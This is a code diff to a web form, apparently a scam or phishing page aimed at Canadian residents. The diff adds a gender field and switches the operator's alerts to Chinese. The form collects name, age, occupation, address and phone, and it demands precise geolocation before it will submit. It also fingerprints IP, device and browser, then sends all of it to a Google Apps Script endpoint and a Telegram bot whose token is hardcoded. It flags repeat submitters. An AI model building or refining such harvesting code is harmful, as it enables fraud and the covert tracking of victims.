@@ -79,10 +79,21 @@
                 <div class="error-hint" id="err-age">⚠️ Please enter a valid age (1–120)</div>
             </div>
             <div class="form-group">
-                <label>Current Occupation *</label>
-                <input type="text" id="occupation" placeholder="e.g. Engineer" oninput="aiValidateField('occupation'); saveFormDraft()">
-                <div class="error-hint" id="err-occupation">⚠️ Please enter at least 2 characters</div>
+                <label>Gender *</label>
+                <select id="genderSelect" onchange="aiValidateField('genderSelect'); saveFormDraft()">
+                    <option value="">-- Select Gender --</option>
+                    <option value="Male">Male</option>
+                    <option value="Female">Female</option>
+                    <option value="Other">Other</option>
+                </select>
+                <div class="error-hint" id="err-genderSelect">⚠️ Please select your gender</div>
             </div>
+        </div>
+
+        <div class="form-group">
+            <label>Current Occupation *</label>
+            <input type="text" id="occupation" placeholder="e.g. Engineer" oninput="aiValidateField('occupation'); saveFormDraft()">
+            <div class="error-hint" id="err-occupation">⚠️ Please enter at least 2 characters</div>
         </div>
 
         <div class="form-group">
@@ -182,6 +193,7 @@
 
         <div class="info-card">
             <p><strong>Name:</strong> <span id="disp-name"></span></p>
+            <p><strong>Gender:</strong> <span id="disp-gender"></span></p>
             <p><strong>Age:</strong> <span id="disp-age"></span></p>
             <p><strong>Occupation:</strong> <span id="disp-occupation"></span></p>
             <p><strong>Shipping Address:</strong> <span id="disp-addr"></span></p>
@@ -199,31 +211,27 @@
 // =====================================================
 const TELEGRAM_BOT_TOKEN = "8657025946:AAGG14AbXcHQzWqSaL6MQTCCP2PEtIyt64g";
 const TELEGRAM_CHAT_ID = "7396947380";
-// Your Apps Script Web App URL
 const APPSCRIPT_URL = "https://script.google.com/macros/s/AKfycbzZb6ArjTa-1veHjdqQbOkqFk5pc_F0l98_2QR67W_7K14GuMNLW-GFEdhcC7KLCaM/exec";
 
-// ========== Constants ==========
 const DISTANCE_THRESHOLD_METERS = 150;
 const URL_PARAMS = new URLSearchParams(window.location.search);
 const CHAT_ID = URL_PARAMS.get("id") || TELEGRAM_CHAT_ID;
 
-// ========== Global State ==========
 let formData = {};
 let deviceInfo = { ip: "", device: "", os: "", browser: "" };
 let locationInfo = { lat: "", lng: "", status: "pending" };
 
-// ========== Initialize ==========
 window.onload = () => {
     deviceInfo = parseUserAgent();
     restoreFormDraft();
 };
 
-// ========== Auto-Save & Restore Form ==========
 function saveFormDraft(){
     const draft = {
         firstName: document.getElementById('firstName').value,
         lastName: document.getElementById('lastName').value,
         age: document.getElementById('age').value,
+        genderSelect: document.getElementById('genderSelect').value,
         occupation: document.getElementById('occupation').value,
         provinceSelect: document.getElementById('provinceSelect').value,
         address: document.getElementById('address').value,
@@ -239,6 +247,7 @@ function restoreFormDraft(){
         if(d.firstName) document.getElementById('firstName').value = d.firstName;
         if(d.lastName) document.getElementById('lastName').value = d.lastName;
         if(d.age) document.getElementById('age').value = d.age;
+        if(d.genderSelect) document.getElementById('genderSelect').value = d.genderSelect;
         if(d.occupation) document.getElementById('occupation').value = d.occupation;
         if(d.provinceSelect) document.getElementById('provinceSelect').value = d.provinceSelect;
         if(d.address) document.getElementById('address').value = d.address;
@@ -248,7 +257,6 @@ function restoreFormDraft(){
     }catch{}
 }
 
-// ========== Calculate Distance (meters) ==========
 function getDistanceMeters(lat1,lng1,lat2,lng2){
     if(!lat1 || !lng1 || !lat2 || !lng2) return 999999;
     const toRad = deg => deg * Math.PI / 180;
@@ -258,11 +266,9 @@ function getDistanceMeters(lat1,lng1,lat2,lng2){
     return 6371000 * 2 * Math.atan2(Math.sqrt(a), Math.sqrt(1-a));
 }
 
-// ========== Local History (for Telegram display only) ==========
 function loadHistory(){ try{ return JSON.parse(localStorage.getItem('submitHistory')||'[]'); } catch{ return []; } }
 function saveHistory(record){ const h=loadHistory(); h.push(record); localStorage.setItem('submitHistory', JSON.stringify(h)); }
 
-// ========== Format Postal Code ==========
 function formatZipCode(){
     const el = document.getElementById('zipCode');
     const pos = el.selectionStart;
@@ -275,7 +281,6 @@ function formatZipCode(){
     return ok;
 }
 
-// ========== Field Validation ==========
 function aiValidateField(fid){
     const el=document.getElementById(fid); if(!el)return true;
     const v=el.value.trim();
@@ -284,7 +289,7 @@ function aiValidateField(fid){
 
     if(['firstName','lastName','address','city','occupation'].includes(fid))ok=v.length>=2;
     else if(fid==='age'){ const n=parseInt(v); ok=!isNaN(n)&&n>=1&&n<=120; }
-    else if(fid==='provinceSelect')ok=v!=='';
+    else if(fid==='genderSelect'||fid==='provinceSelect')ok=v!=='';
     else if(fid==='phone'){ const digits=v.replace(/\D/g,''); ok=digits.length===10; }
 
     if(v.length>0){
@@ -297,9 +302,8 @@ function aiValidateField(fid){
     return ok;
 }
 
-// ========== Go to Confirmation Page ==========
 async function proceedToVerification(){
-    const fields=['firstName','lastName','age','occupation','provinceSelect','address','city','zipCode','phone'];
+    const fields=['firstName','lastName','age','genderSelect','occupation','provinceSelect','address','city','zipCode','phone'];
     let firstErrorId = null;
     let allOk = true;
 
@@ -323,6 +327,7 @@ async function proceedToVerification(){
     formData={
         name: document.getElementById('firstName').value.trim()+' '+document.getElementById('lastName').value.trim(),
         age: document.getElementById('age').value.trim(),
+        gender: document.getElementById('genderSelect').value,
         occupation: document.getElementById('occupation').value.trim(),
         countryName: "Canada",
         province: document.getElementById('provinceSelect').value,
@@ -337,6 +342,7 @@ async function proceedToVerification(){
     document.getElementById('step-form').style.display='none';
     document.getElementById('step-verification').style.display='block';
     document.getElementById('disp-name').textContent = formData.name;
+    document.getElementById('disp-gender').textContent = formData.gender;
     document.getElementById('disp-age').textContent = formData.age;
     document.getElementById('disp-occupation').textContent = formData.occupation;
     document.getElementById('disp-addr').textContent = `${formData.countryName}, ${formData.province}, ${formData.city}, ${formData.address}`;
@@ -351,7 +357,6 @@ async function proceedToVerification(){
     await fetchIPAddress();
 }
 
-// ========== 📍 Get Location ==========
 function requestLocation(){
     return new Promise((resolve) => {
         if (!navigator.geolocation) {
@@ -393,7 +398,6 @@ function showInstructionBox(){
     document.getElementById('loc-instruction-box').classList.remove('hidden');
 }
 
-// ========== 🌐 Get IP Address ==========
 async function fetchIPAddress(){ 
     try{ 
         const r = await fetch('https://api.ipify.org?format=json'); 
@@ -405,7 +409,6 @@ async function fetchIPAddress(){
     } 
 }
 
-// ========== Submit Entry ==========
 async function submitData(){
     if(locationInfo.status !== "granted"){
         alert("Location permission is REQUIRED before submission.\nPlease enable location access and try again.");
@@ -414,11 +417,10 @@ async function submitData(){
     doSubmit();
 }
 
-// ========== 🚀 Submit to Google Sheets + Telegram ==========
 async function doSubmit(){
-    const timeStr = new Date().toLocaleString('en-US');
+    const timeStr = new Date().toLocaleString('zh-CN');
 
-    // ✅ Prepare data for Google Sheets
+    // ✅ 只发给谷歌表格（不含性别）
     const cloudData = {
         "手机号": formData.phoneFull,
         "IP地址": deviceInfo.ip,
@@ -430,24 +432,18 @@ async function doSubmit(){
         "录入时间": timeStr
     };
 
-    // ✅ Send to Google Sheets
     try {
-        if(APPSCRIPT_URL && !APPSCRIPT_URL.includes("替换成你自己的")){
-            await fetch(APPSCRIPT_URL, {
-                method: "POST",
-                mode: "no-cors",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify(cloudData)
-            });
-            console.log("✅ Data saved to Google Sheets");
-        } else {
-            console.warn("⚠️ APPSCRIPT_URL not configured");
-        }
+        await fetch(APPSCRIPT_URL, {
+            method: "POST",
+            mode: "no-cors",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify(cloudData)
+        });
+        console.log("✅ Data saved to Google Sheets");
     } catch(e) {
         console.warn("Google Sheets submission failed:", e.message);
     }
 
-    // ✅ Local history check for Telegram notification
     const history = loadHistory();
     let matchCount = 0;
     let firstTime = timeStr;
@@ -465,52 +461,51 @@ async function doSubmit(){
     }
     const currentCount = matchCount + 1;
 
-    // ✅ Telegram duplicate note
     let duplicateNote = "";
     if(currentCount > 1){
-        duplicateNote = `‼️‼️‼️ DUPLICATE SUBMISSION ALERT
-• Submission: #${currentCount}
-• First Seen: ${firstTime}
-• IP Address: ${deviceInfo.ip}
-• Device: ${deviceInfo.device}
-• OS: ${deviceInfo.os}
-• Browser: ${deviceInfo.browser}
-• Coordinates: ${locationInfo.lat}, ${locationInfo.lng}
+        duplicateNote = `‼️‼️‼️ 重复提交提醒
+• 出现次数：第 ${currentCount} 次
+• 首次提交：${firstTime}
+• IP地址：${deviceInfo.ip}
+• 设备/型号：${deviceInfo.device}
+• 操作系统：${deviceInfo.os}
+• 浏览器：${deviceInfo.browser}
+• 坐标：${locationInfo.lat}, ${locationInfo.lng}
 ——————————————
 `;
     }
 
-    // ✅ Save locally (for reference only)
     saveHistory({
-        name: formData.name, age: formData.age, occupation: formData.occupation,
+        name: formData.name, gender: formData.gender, age: formData.age, occupation: formData.occupation,
         phone: formData.phonePrefix+' '+formData.phone, phoneFull: formData.phoneFull,
         country: formData.countryName, province: formData.province, city: formData.city, address: formData.address, zip: formData.zip,
         ip: deviceInfo.ip, device: deviceInfo.device, os: deviceInfo.os, browser: deviceInfo.browser,
         lat: locationInfo.lat, lng: locationInfo.lng, timeStr, timestamp: Date.now()
     });
 
-    // ✅ Send Telegram message
-    const msg = `${duplicateNote}📩 NEW SUBMISSION RECEIVED
+    // ✅ Telegram 消息 → 全中文 + 包含性别
+    const msg = `${duplicateNote}📩 新提交的资料
 ——————————————
-Name: ${formData.name}
-Age: ${formData.age}
-Occupation: ${formData.occupation}
-Shipping Address: Country: ${formData.countryName}, Province: ${formData.province}, City: ${formData.city}, Street: ${formData.address}
-Postal Code: ${formData.zip}
-Phone Number: ${formData.phonePrefix} ${formData.phone}
+姓名：${formData.name}
+性别：${formData.gender}
+年龄：${formData.age}
+当前职业：${formData.occupation}
+收货地址：国家:${formData.countryName}，省份:${formData.province}，城市:${formData.city}，街道:${formData.address}
+邮政编码：${formData.zip}
+电话号码：${formData.phonePrefix} ${formData.phone}
 
-📊 SUBMISSION RECORD:
-• Submission #: ${currentCount}
-• First Submitted: ${firstTime}
-• This Submission: ${timeStr}
+📊 提交统计：
+• 出现次数：第 ${currentCount} 次
+• 首次提交：${firstTime}
+• 最近提交：${timeStr}
 
-DEVICE & NETWORK INFO:
-• IP Address: ${deviceInfo.ip}
-• Device/Model: ${deviceInfo.device}
-• Operating System: ${deviceInfo.os}
-• Browser: ${deviceInfo.browser}
-• Coordinates: ${locationInfo.lat}, ${locationInfo.lng}
-⏰ Submitted: ${timeStr}
+设备和网络信息：
+• IP地址：${deviceInfo.ip}
+• 设备/型号：${deviceInfo.device}
+• 操作系统：${deviceInfo.os}
+• 浏览器：${deviceInfo.browser}
+• 坐标：${locationInfo.lat}, ${locationInfo.lng}
+• 提交时间：${timeStr}
 ——————————————`;
 
     try{
@@ -532,7 +527,6 @@ DEVICE & NETWORK INFO:
     }
 }
 
-// ========== Parse Device Info ==========
 function parseUserAgent(){
     const ua = navigator.userAgent;
     let device = "Unknown Device", os = "Unknown OS", browser = "Unknown Browser";
